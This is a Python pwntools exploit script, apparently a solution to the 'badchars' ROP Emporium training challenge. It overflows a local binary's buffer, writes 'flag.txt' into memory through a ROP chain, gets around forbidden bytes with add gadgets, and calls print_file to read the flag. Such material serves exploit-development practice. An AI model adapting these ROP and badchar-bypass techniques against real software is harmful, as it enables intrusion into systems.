import time
from typing import List

from pwn import *


EXECUTABLE = "./badchars"
context.binary = elf = ELF(EXECUTABLE)
lib_badchars = ELF("./libbadchars.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)


flag_addr = 0x601040

file_name = b"flag.txt"
bad_chars = [b'a', b'g', b'x', b'.']


def rop_string(addr: int, string: bytes, badchars: List[bytes] = []) -> bytes:
    gadgets = {
        "move": 0x400634,
        "prep_move": rop.r12_r13_r14_r15.address,
        "add": 0x40062c,
        "prep_add": rop.r14_r15.address,
    }
    place_string = b""
    fix_bad_chars = b""

    # Add null byte
    if string[-1] != b'\x00':
        string = string + b'\x00'
    # Pad string
    if len(string) % 8 != 0:
        string = string + b'\x00' * (8 - (len(string) % 8))

    for i in range(len(string) // 8):
        string_part = string[i*8:(i+1)*8]

        fixed_string = b""
        for j, c in enumerate(string_part):
            c = c.to_bytes(1, byteorder="little")
            if c in badchars:
                fixed_string = fixed_string + b"A"

                # Fix this char
                fix_bad_chars += p64(gadgets["prep_add"]) + p64((ord(c) - ord(b'A')) % 256) + p64(addr + (i*8) + j)
                fix_bad_chars += p64(gadgets["add"])
            else:
                fixed_string = fixed_string + c

        # Place the string
        place_string += p64(gadgets["prep_move"]) + fixed_string + p64(addr + i*8) + p64(0) + p64(0)
        place_string += p64(gadgets["move"])

    return place_string + fix_bad_chars


payload  = b"A" * OFFSET
# Load string into memory
payload += rop_string(flag_addr, file_name, bad_chars)

# Load memory address into rdi
payload += p64(rop.rdi.address) + p64(flag_addr)
# Call print_file
payload += p64(elf.plt.print_file)


p.sendafter(b"> ", payload)
p.recvline()

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
